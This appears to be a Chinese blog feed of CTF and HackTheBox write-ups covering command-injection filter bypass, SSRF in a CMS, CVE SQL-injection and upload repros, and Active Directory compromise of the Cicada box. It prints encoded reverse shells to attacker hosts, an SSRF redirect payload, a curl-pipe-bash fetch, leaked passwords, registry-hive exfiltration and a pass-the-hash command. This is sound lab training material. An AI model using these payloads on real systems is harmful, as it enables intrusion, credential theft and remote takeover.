<p><img src="/article/CISCN2024%E5%88%9D%E8%B5%9B/image-20240523184748038.png"></p>
<p>由于点号和星号被过滤了，所以使用-r参数</p>
<p>本地测试发现在<code>php -r</code>情况下<code>()</code>并不会因为转义影响代码执行，并且并不需要<code>&#39;&#39;</code>包裹代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php -r <span class="keyword">print</span>(<span class="number">1</span>);</span><br></pre></td></tr></table></figure>

<p>确实能执行简单命令，但是过滤这么多就要考虑编码绕过（base64不行就用hex代替）</p>
<p>执行id命令测试下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php -r <span class="title function_ invoke__">system</span>(<span class="title function_ invoke__">hex2bin</span>(<span class="number">6964</span>));</span><br></pre></td></tr></table></figure>

<p><img src="/article/CISCN2024%E5%88%9D%E8%B5%9B/image-20240523185423466.png"></p>
<p>进一步测试时发现，如果命令过长hex加密后会出现英文字母导致报错</p>
<p>这里需要借助substr函数的特性<code>强转字符串</code>，然后再截断多余字符</p>
<p>那么我们弹个shell先</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># bash -i &gt;&amp; /dev/tcp/5i781963p2.yicp.fun/47829 0&gt;&amp;1</span><br><span class="line">bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC81aTc4MTk2M3AyLnlpY3AuZnVuLzQ3ODI5IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre></td></tr></table></figure>

<p>hex编码一下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php -r system(hex2bin(substr(_62617368202d63207b6563686f2c596d467a614341746153412b4a6941765a4756324c33526a63433831615463344d546b324d3341794c6e6c70593341755a6e56754c7a51334f4449354944412b4a6a453d7d7c7b6261736536342c2d647d7c7b626173682c2d697d,1)));</span><br></pre></td></tr></table></figure>

<p>不过由于ctfshow平台的问题弹不成功</p>
<p>并且在根目录下以及环境变量都没有flag，我们执行<code>paste /etc/passwd</code></p>
<p><img src="/article/CISCN2024%E5%88%9D%E8%B5%9B/image-20240523192807005.png"></p>
<p>可以注意到存在mysql用户，那么猜测flag在数据库里</p>
<p>使用默认用户和密码和<code>-e</code>参数去查询</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql -u root -proot -e &quot;show databases;&quot;</span><br><span class="line">mysql -u root -proot -e &quot;use PHP_CMS;show tables;&quot;</span><br><span class="line">mysql -u root -proot -e &quot;use PHP_CMS;select * from F1ag_Se3Re7;&quot;</span><br></pre></td></tr></table></figure>

<p>得到flag</p>
<p><img src="/article/CISCN2024%E5%88%9D%E8%B5%9B/image-20240523193507959.png"></p>
<h1 id="easycms"><a href="#easycms" class="headerlink" title="easycms"></a>easycms</h1><p>扫一下目录发现存在<code>/flag.php</code></p>
<p>题目给了hint</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if($_SERVER[&quot;REMOTE_ADDR&quot;] != &quot;127.0.0.1&quot;)&#123;</span><br><span class="line">   echo &quot;Just input &#x27;cmd&#x27; From 127.0.0.1&quot;;</span><br><span class="line">   return;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">   system($_GET[&#x27;cmd&#x27;]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>限制了ip为127.0.0.1才能命令执行，很明显的ssrf</p>
<p>从github上把源码下载下来后，全局搜索<code>curl_exec</code>，找到两个函数分别是<code>dr_catcher_data</code>和<code>dr_post_json_data</code>不过暂时不知道如何利用</p>
<p>我们访问官方网站查看公布的漏洞列表，注意到qrcode存在ssrf漏洞 <a href="https://m.xunruicms.com/bug/">官网链接</a></p>
<p><img src="/article/CISCN2024%E5%88%9D%E8%B5%9B/image-20240523202014573.png"></p>
<p>用Seay代审全局搜索找到qrcode函数，注意到有调用<code>dr_catcher_data</code>函数</p>
<p><img src="/article/CISCN2024%E5%88%9D%E8%B5%9B/image-20240523202224434.png"></p>
<p>我们肯定是利用curl来ssrf，现在有两个要解决的问题</p>
<ol>
<li>如何构造payload</li>
<li>如何构造php文件使得以127.0.0.1去访问<code>/flag.php</code></li>
</ol>
<p><strong>构造payload</strong></p>
<p>我们注意到调用<code>dr_catcher_data</code>函数的时候参数为<code>$thumb</code>，全局搜索一下还是在<code>Helper.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//二维码调用</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">dr_qrcode</span>(<span class="params"><span class="variable">$text</span>, <span class="variable">$thumb</span> = <span class="string">&#x27;&#x27;</span>, <span class="variable">$level</span> = <span class="string">&#x27;H&#x27;</span>, <span class="variable">$size</span> = <span class="number">5</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> ROOT_URL.<span class="string">&#x27;index.php?s=api&amp;c=api&amp;m=qrcode&amp;thumb=&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(<span class="variable">$thumb</span>).<span class="string">&#x27;&amp;text=&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(<span class="variable">$text</span>).<span class="string">&#x27;&amp;size=&#x27;</span>.<span class="variable">$size</span>.<span class="string">&#x27;&amp;level=&#x27;</span>.<span class="variable">$level</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在进行二维码调用的时候会出现<code>$thumb</code>，给他赋值去读取我们vps上的恶意文件，从而传递给<code>dr_catcher_data</code>函数</p>
<p>payload如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://d068a101-a0c4-4e49-990f-06f5fea551f9.challenge.ctf.show/?s=api&amp;c=api&amp;m=qrcode&amp;thumb=http://45.136.15.177:1028/shell.php&amp;text=1&amp;size=1&amp;level=1</span><br></pre></td></tr></table></figure>

<p>我们可以先测试下能否访问，这里vps是借吕哥的</p>
<p>ssh连上后创建shell.php文件，然后本地开启php服务</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php -S 0.0.0.0:1028</span><br></pre></td></tr></table></figure>

<p>靶机执行payload，成功访问（执行的payload只能一次，再执行要修改size大小）</p>
<p><img src="/article/CISCN2024%E5%88%9D%E8%B5%9B/image-20240523204851334.png"></p>
<p>接下来要解决如何构造php文件</p>
<p><strong>构造shell.php</strong></p>
<p>目的是以ip为127.0.0.1去访问，所以我们可以利用location去重定向</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$target_url=&quot;http://127.0.0.1/flag.php&quot;;</span><br><span class="line">header(&quot;Location: &quot;. $target_url);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>编写好后，执行payload成功发生302跳转</p>
<p><img src="/article/CISCN2024%E5%88%9D%E8%B5%9B/image-20240523205505740.png"></p>
<p>我们可以反弹shell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$target_url=&quot;http://127.0.0.1/flag.php?cmd=bash%20-c%20%22bash%20-i%20%3E&amp;%20/dev/tcp/45.136.15.177/777%200%3E&amp;1%22&quot;;</span><br><span class="line">header(&quot;Location: &quot;. $target_url);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>或者在vps写个sh脚本来弹，然后用curl去访问</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$target_url=&quot;http://127.0.0.1/flag.php?cmd=curl%20http://45.136.15.177:1028/reverse.sh%20%7Cbash&quot;;</span><br><span class="line">header(&quot;Location: &quot;. $target_url);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/article/CISCN2024%E5%88%9D%E8%B5%9B/image-20240523214508243.png"></p>
<p>反弹成功后得到flag</p>
]]></content>
      <categories>
        <category>CTF比赛</category>
      </categories>
      <tags>
        <tag>CMS</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2022-28512</title>
    <url>/article/CVE-2022-28512.html</url>
    <content><![CDATA[<p>Fantastic Blog (CMS)是一个博客&#x2F;文章网络内容管理系统。该CMS的&#x2F;single.php路径下，id参数存在一个SQL注入漏洞</p>
<span id="more"></span>

<h1 id="CVE-2022-28512"><a href="#CVE-2022-28512" class="headerlink" title="CVE-2022-28512"></a>CVE-2022-28512</h1><p>打开题目</p>
<p><img src="/article/CVE-2022-28512/image-20240413231746967.png"></p>
<p>按照漏洞描述在<code>/single.php</code>路径的参数id存在sql注入漏洞，我们手动注入一下</p>
<p><img src="/article/CVE-2022-28512/image-20240413231855630.png"></p>
<p>可以发现测试成功，我们bp抓包并保存下来，然后使用sqlmap</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -l &quot;./requests/1.txt&quot;</span><br></pre></td></tr></table></figure>

<p>得到flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -l &quot;./requests/1.txt&quot; -D ctf -T flag -C flag --dump</span><br></pre></td></tr></table></figure>

<p><img src="/article/CVE-2022-28512/image-20240413232423326.png"></p>
]]></content>
      <categories>
        <category>春秋云镜</category>
        <category>漏洞复现</category>
      </categories>
  </entry>
  <entry>
    <title>CVE-2022-32991</title>
    <url>/article/CVE-2022-32991.html</url>
    <content><![CDATA[<p>该CMS的welcome.php中存在SQL注入攻击</p>
<span id="more"></span>

<h2 id="CVE-2022-32991"><a href="#CVE-2022-32991" class="headerlink" title="CVE-2022-32991"></a>CVE-2022-32991</h2><p>随便注册一个用户登录</p>
<p><img src="/article/CVE-2022-32991/image-20240125122119271.png"></p>
<p>对各个页面的参数就行sqlmap扫描</p>
<p>最终在Janobe Sourcecode测试出eid参数存在sql注入</p>
<p><img src="/article/CVE-2022-32991/image-20240125122159745.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://eci-2ze9bpwkd9h3b5v3kfo5.cloudeci1.ichunqiu.com/welcome.php?q=quiz&amp;step=2&amp;eid=60377db362694&amp;n=1&amp;t=34&quot; --cookie=&quot;Hm_lvt_2d0601bd28de7d49818249cf35d95943=1706068419,1706092531,1706155955; Hm_lpvt_2d0601bd28de7d49818249cf35d95943=1706155955; PHPSESSID=ffu4h67f4fgtpmp0m9cn2gancs&quot; -D ctf -T flag -C flag --dump</span><br></pre></td></tr></table></figure>

<p>得到flag</p>
<p><img src="/article/CVE-2022-32991/image-20240125122248984.png"></p>
]]></content>
      <categories>
        <category>春秋云镜</category>
        <category>漏洞复现</category>
      </categories>
  </entry>
  <entry>
    <title>CVE-2022-30887</title>
    <url>/article/CVE-2022-30887.html</url>
    <content><![CDATA[<p>多语言药房管理系统 (MPMS) 是用 PHP 和 MySQL 开发的，该CMS中php_action&#x2F;editProductImage.php存在任意文件上传漏洞</p>
<span id="more"></span>

<h1 id="CVE-2022-30887"><a href="#CVE-2022-30887" class="headerlink" title="CVE-2022-30887"></a>CVE-2022-30887</h1><p>打开题目，利用社工手段得到用户密码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">email：mayuri.infospace@gmail.com</span><br><span class="line">password：mayurik</span><br></pre></td></tr></table></figure>

<p>登陆成功后找到文件上传点</p>
<p><img src="/article/CVE-2022-30887/image-20240413113616413.png"></p>
<p>不过这里的洞被修复了，然后找到我们可以修改存在的药品图片也有文件上传功能</p>
<p><img src="/article/CVE-2022-30887/image-20240413123550782.png"></p>
<p>抓包修改下文件内容即可</p>
<p><img src="/article/CVE-2022-30887/image-20240725090913072.png"></p>
<p>F12查看下马的上传路径</p>
<p><img src="/article/CVE-2022-30887/image-20240725091109347.png" alt="image-20240725091109347"></p>
<p>访问直接命令执行，得到flag</p>
<p><img src="/article/CVE-2022-30887/image-20240725091251513.png" alt="image-20240725091251513"></p>
]]></content>
      <categories>
        <category>春秋云镜</category>
        <category>漏洞复现</category>
      </categories>
  </entry>
  <entry>
    <title>Cicada</title>
    <url>/article/Cicada.html</url>
    <content><![CDATA[<p>本靶机用到比较多工具考察信息搜集能力，利用SAM 和 SYSTEM 注册表配置单元提取本地管理员的密码哈希值</p>
<span id="more"></span>

<h1 id="Cicada"><a href="#Cicada" class="headerlink" title="Cicada"></a>Cicada</h1><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>nmap扫描端口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -sV -v -p- -min-rate=3000 10.10.11.35</span><br></pre></td></tr></table></figure>

<p>扫描结果</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PORT      STATE SERVICE       VERSION</span><br><span class="line">53/tcp    open  domain        Simple DNS Plus</span><br><span class="line">88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-10-08 22:29:34Z)</span><br><span class="line">135/tcp   open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)</span><br><span class="line">445/tcp   open  microsoft-ds?</span><br><span class="line">464/tcp   open  kpasswd5?</span><br><span class="line">593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)</span><br><span class="line">3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)</span><br><span class="line">3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)</span><br><span class="line">5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">65132/tcp open  msrpc         Microsoft Windows RPC</span><br></pre></td></tr></table></figure>

<h2 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h2><p>注意到445端口开放，smb连接看下共享文件</p>
<p><img src="/article/Cicada/image-20241008232230999.png"></p>
<p>经过测试发现HR共享文件夹下存在txt文件，get下载到本地</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">smbclient \\\\10.10.11.35\\HR</span><br></pre></td></tr></table></figure>

<p><img src="/article/Cicada/image-20241008232317599.png"></p>
<p>查看文件泄露了用户和密码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Cicada$M6Corpb*@Lp#nZp!8</span><br></pre></td></tr></table></figure>

<p><img src="/article/Cicada/image-20241008232423823.png"></p>
<p>尝试使用kerbrute爆破用户名，爆了很久没爆出来</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./kerbrute_linux_amd64 userenum -d cicada.htb /home/rev1ve/shentou/dict/username/ --dc 10.10.11.35</span><br></pre></td></tr></table></figure>

<p>换成netexec进行smb协议暴力枚举用户，使用我们前面列举的用户名去空密码登录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nxc smb 10.10.11.35 -u Guest -p &#x27;&#x27; --rid-brute &gt; user_list.txt</span><br></pre></td></tr></table></figure>

<p>枚举结果如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[*] First time use detected</span><br><span class="line">[*] Creating home directory structure</span><br><span class="line">[*] Creating missing folder logs</span><br><span class="line">[*] Creating missing folder modules</span><br><span class="line">[*] Creating missing folder protocols</span><br><span class="line">[*] Creating missing folder workspaces</span><br><span class="line">[*] Creating missing folder obfuscated_scripts</span><br><span class="line">[*] Creating missing folder screenshots</span><br><span class="line">[*] Creating default workspace</span><br><span class="line">[*] Initializing FTP protocol database</span><br><span class="line">[*] Initializing VNC protocol database</span><br><span class="line">[*] Initializing SSH protocol database</span><br><span class="line">[*] Initializing LDAP protocol database</span><br><span class="line">[*] Initializing WINRM protocol database</span><br><span class="line">[*] Initializing RDP protocol database</span><br><span class="line">[*] Initializing SMB protocol database</span><br><span class="line">[*] Initializing WMI protocol database</span><br><span class="line">[*] Initializing MSSQL protocol database</span><br><span class="line">[*] Copying default configuration file</span><br><span class="line">SMB                      10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)</span><br><span class="line">SMB                      10.10.11.35     445    CICADA-DC        [+] cicada.htb\Guest: </span><br><span class="line">SMB                      10.10.11.35     445    CICADA-DC        498: CICADA\Enterprise Read-only Domain Controllers (SidTypeGroup)</span><br><span class="line">SMB                      10.10.11.35     445    CICADA-DC        500: CICADA\Administrator (SidTypeUser)</span><br><span class="line">SMB                      10.10.11.35     445    CICADA-DC        501: CICADA\Guest (SidTypeUser)</span><br><span class="line">SMB                      10.10.11.35     445    CICADA-DC        502: CICADA\krbtgt (SidTypeUser)</span><br><span class="line">SMB                      10.10.11.35     445    CICADA-DC        512: CICADA\Domain Admins (SidTypeGroup)</span><br><span class="line">SMB                      10.10.11.35     445    CICADA-DC        513: CICADA\Domain Users (SidTypeGroup)</span><br><span class="line">SMB                      10.10.11.35     445    CICADA-DC        514: CICADA\Domain Guests (SidTypeGroup)</span><br><span class="line">SMB                      10.10.11.35     445    CICADA-DC        515: CICADA\Domain Computers (SidTypeGroup)</span><br><span class="line">SMB                      10.10.11.35     445    CICADA-DC        516: CICADA\Domain Controllers (SidTypeGroup)</span><br><span class="line">SMB                      10.10.11.35     445    CICADA-DC        517: CICADA\Cert Publishers (SidTypeAlias)</span><br><span class="line">SMB                      10.10.11.35     445    CICADA-DC        518: CICADA\Schema Admins (SidTypeGroup)</span><br><span class="line">SMB                      10.10.11.35     445    CICADA-DC        519: CICADA\Enterprise Admins (SidTypeGroup)</span><br><span class="line">SMB                      10.10.11.35     445    CICADA-DC        520: CICADA\Group Policy Creator Owners (SidTypeGroup)</span><br><span class="line">SMB                      10.10.11.35     445    CICADA-DC        521: CICADA\Read-only Domain Controllers (SidTypeGroup)</span><br><span class="line">SMB                      10.10.11.35     445    CICADA-DC        522: CICADA\Cloneable Domain Controllers (SidTypeGroup)</span><br><span class="line">SMB                      10.10.11.35     445    CICADA-DC        525: CICADA\Protected Users (SidTypeGroup)</span><br><span class="line">SMB                      10.10.11.35     445    CICADA-DC        526: CICADA\Key Admins (SidTypeGroup)</span><br><span class="line">SMB                      10.10.11.35     445    CICADA-DC        527: CICADA\Enterprise Key Admins (SidTypeGroup)</span><br><span class="line">SMB                      10.10.11.35     445    CICADA-DC        553: CICADA\RAS and IAS Servers (SidTypeAlias)</span><br><span class="line">SMB                      10.10.11.35     445    CICADA-DC        571: CICADA\Allowed RODC Password Replication Group (SidTypeAlias)</span><br><span class="line">SMB                      10.10.11.35     445    CICADA-DC        572: CICADA\Denied RODC Password Replication Group (SidTypeAlias)</span><br><span class="line">SMB                      10.10.11.35     445    CICADA-DC        1000: CICADA\CICADA-DC$ (SidTypeUser)</span><br><span class="line">SMB                      10.10.11.35     445    CICADA-DC        1101: CICADA\DnsAdmins (SidTypeAlias)</span><br><span class="line">SMB                      10.10.11.35     445    CICADA-DC        1102: CICADA\DnsUpdateProxy (SidTypeGroup)</span><br><span class="line">SMB                      10.10.11.35     445    CICADA-DC        1103: CICADA\Groups (SidTypeGroup)</span><br><span class="line">SMB                      10.10.11.35     445    CICADA-DC        1104: CICADA\john.smoulder (SidTypeUser)</span><br><span class="line">SMB                      10.10.11.35     445    CICADA-DC        1105: CICADA\sarah.dantelia (SidTypeUser)</span><br><span class="line">SMB                      10.10.11.35     445    CICADA-DC        1106: CICADA\michael.wrightson (SidTypeUser)</span><br><span class="line">SMB                      10.10.11.35     445    CICADA-DC        1108: CICADA\david.orelious (SidTypeUser)</span><br><span class="line">SMB                      10.10.11.35     445    CICADA-DC        1109: CICADA\Dev Support (SidTypeGroup)</span><br><span class="line">SMB                      10.10.11.35     445    CICADA-DC        1601: CICADA\emily.oscars (SidTypeUser)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>写个脚本把符合条件的User用户名提取出来</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义输入和输出文件路径</span></span><br><span class="line">input_file = <span class="string">r&#x27;./user_list.txt&#x27;</span></span><br><span class="line">output_file = <span class="string">r&#x27;./user.txt&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用正则表达式来匹配 \ 和 (SidTypeUser) 之间的内容</span></span><br><span class="line">pattern = re.<span class="built_in">compile</span>(<span class="string">r&#x27;\\(.*?)(?= \(SidTypeUser\))&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打开输入文件并读取所有行</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(input_file, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> infile:</span><br><span class="line">    lines = infile.readlines()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 提取匹配的内容</span></span><br><span class="line">users = []</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">    <span class="keyword">match</span> = pattern.search(line)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">        <span class="comment"># 如果找到匹配项，则添加到用户列表中</span></span><br><span class="line">        users.append(<span class="keyword">match</span>.group(<span class="number">1</span>).strip())</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将提取的用户名写入输出文件</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(output_file, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> outfile:</span><br><span class="line">    <span class="keyword">for</span> user <span class="keyword">in</span> users:</span><br><span class="line">        outfile.write(user + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Extracted usernames have been saved to <span class="subst">&#123;output_file&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>提取结果如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Administrator</span><br><span class="line">Guest</span><br><span class="line">krbtgt</span><br><span class="line">CICADA-DC$</span><br><span class="line">john.smoulder</span><br><span class="line">sarah.dantelia</span><br><span class="line">michael.wrightson</span><br><span class="line">david.orelious</span><br><span class="line">emily.oscars</span><br></pre></td></tr></table></figure>

<p>我们根据刚刚扫描的结果389端口是开放的，尝试把LDAP的信息dump出来。这里把扫出来的用户名都试试，最终测试出密码属于michael.wrightson的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ldapdomaindump ldap://10.10.11.35 -u &#x27;cicada.htb\michael.wrightson&#x27; -p &#x27;Cicada$M6Corpb*@Lp#nZp!8&#x27; -o ./dump_output</span><br></pre></td></tr></table></figure>

<p><img src="/article/Cicada/image-20241011093650368.png"></p>
<p>文件比较多，我们使用find命令找下有没有包含password</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find . -type f -exec grep -l &#x27;password&#x27; &#123;&#125; +</span><br></pre></td></tr></table></figure>

<p><img src="/article/Cicada/image-20241017201824193.png"></p>
<p>主要是找user文件，成功得到david.orelious用户密码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">aRt$Lp#7t*VQ!3</span><br></pre></td></tr></table></figure>

<p><img src="/article/Cicada/image-20241017201930411.png"></p>
<p>我们前面测过DEV共享文件夹权限不够，那么尝试登录看看</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">smbclient \\\\10.10.11.35\\DEV -U cicada.htb/david.orelious</span><br></pre></td></tr></table></figure>

<p><img src="/article/Cicada/image-20241017202335022.png"></p>
<p>把文件get下载下来，得到emily.oscars用户密码</p>
<p><img src="/article/Cicada/image-20241017202403476.png"></p>
<p>前面扫描结果还开放了<strong>5985</strong>端口，该端口使用WinRM 服务，支持 PowerShell 远程管理和 WMI。</p>
<p><img src="/article/Cicada/image-20241017203005631.png"></p>
<p>在用户桌面得到user的flag</p>
<p><img src="/article/Cicada/image-20241017203546289.png"></p>
<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>并且我们注意到有sam和system文件，那么可以进行哈希传递攻击</p>
<p>我们先备份一下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg save hklm\system C:\Users\emily.oscars.CICADA\system.hive</span><br><span class="line">reg save hklm\sam C:\Users\emily.oscars.CICADA\sam.hive </span><br></pre></td></tr></table></figure>

<p><img src="/article/Cicada/image-20241017205427251.png"></p>
<p>在本地开启smb服务器，建立共享获取敏感文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo impacket-smbserver getinfo . -smb2support -username rev1ve -password rev1ve@.</span><br></pre></td></tr></table></figure>

<p><img src="/article/Cicada/image-20241018000655886.png"></p>
<p>然后在靶机建立共享连接，使用copy-item命令复制到我们攻击机上</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net use \\10.10.16.13\getinfo /user:rev1ve rev1ve@.</span><br><span class="line">copy-item C:\Users\emily.oscars.CICADA\sam.hive \\10.10.16.13\getinfo\sam.hive</span><br><span class="line">copy-item C:\Users\emily.oscars.CICADA\system.hive \\10.10.16.13\getinfo\system.hive</span><br></pre></td></tr></table></figure>

<p><img src="/article/Cicada/image-20241018000644233.png"></p>
<p>使用 impacket 检索用户的密码哈希值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 /home/rev1ve/shentou/protocol/impacket-0.10.0/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL</span><br></pre></td></tr></table></figure>

<p><img src="/article/Cicada/image-20241018000845868.png"></p>
<p>使用管理员的哈希来执行哈希传递攻击，成功具有SYSTEM权限的访问权限</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 /home/rev1ve/shentou/protocol/impacket-0.10.0/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341 administrator@10.10.16.35</span><br></pre></td></tr></table></figure>

<p><img src="/article/Cicada/image-20241018001207218.png"></p>
]]></content>
      <categories>
        <category>渗透</category>
      </categories>
      <tags>
        <tag>HackTheBox</tag>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title>Clicker</title>
    <url>/article/Clicker-HackTheBox.html</url>
    <content><![CDATA[<p>session伪造、perl_startup提权</p>
<span id="more"></span>



<h1 id="Clicker"><a href="#Clicker" class="headerlink" title="Clicker"></a>Clicker</h1><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>nmap扫描一下端口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sV -sC -v -p- --min-rate 1000 10.10.11.232</span><br></pre></td></tr></table></figure>

<p><img src="/article/Clicker-HackTheBox/image-20240109203146750.png"></p>
<p>扫描结果</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">22/tcp    open  ssh</span><br><span class="line">80/tcp    open  http    Apache httpd 2.4.52 ((Ubuntu)) //重定向</span><br><span class="line">111/tcp   open  rpcbind 2-4 (RPC #100000)</span><br></pre></td></tr></table></figure>

<p>我们往下看发现启用了nfs协议</p>
<p><img src="/article/Clicker-HackTheBox/image-20240109230610834.png"></p>
<p>去网上查询下相关资料 <a href="https://zhuanlan.zhihu.com/p/607202498?utm_id=0">参考文章</a></p>
<blockquote>
<p>NFS最大的功能就是可以透过网络，让不同的机器、不同的操作系统、可以彼此分享个别的档案(share  files)。所以，你也可以简单地将它看做是一个文件服务器(file  server)。这个NFS服务器可以让你的PC来将网络远程的NFS服务器分享的目录，挂载到本地端的机器当中，在本地端的机器看起来，那个远程主机的目录就好像是自己的一个磁盘分区槽一样(partition)，使用上相当的便利。</p>
</blockquote>
<p>既然可以远程读取文件，那么我们使用mount命令将远程NFS文件系统挂载到本地目录</p>
<p>在本地创建目录<code>mnt/nfs_file</code>，然后读取根目录文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo mount -o nolock 10.10.11.232:/ ~/test/mnt/nfs_file</span><br></pre></td></tr></table></figure>

<p>注：<code>-o</code>：指定挂载选项，比如读写权限、访问权限等</p>
<p>​		<code>nolock</code> 是在挂载 NFS 文件系统时的一种选项，用于禁用文件锁定机制，使得同时进行读写操作不受文件锁定限制</p>
<p>我们ls一下，发现zip文件</p>
<p><img src="/article/Clicker-HackTheBox/image-20240109232705184.png"></p>
<p>解压发现不行，用cp命令复制到本地即可</p>
<p><img src="/article/Clicker-HackTheBox/image-20240109233234476.png"></p>
<p>由于80端口出现重定向，那么我们添加域名到<code>/etc/hosts</code></p>
<p>开始进行下一步</p>
<h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><p>我们在admin.php注意到有对session进行身份验证，如果验证失败则重定向到index.php</p>
<p><img src="/article/Clicker-HackTheBox/image-20240110162754718.png"></p>
<p>那么我们尝试得到admin的session，接着在save_game.php找到可利用的地方</p>
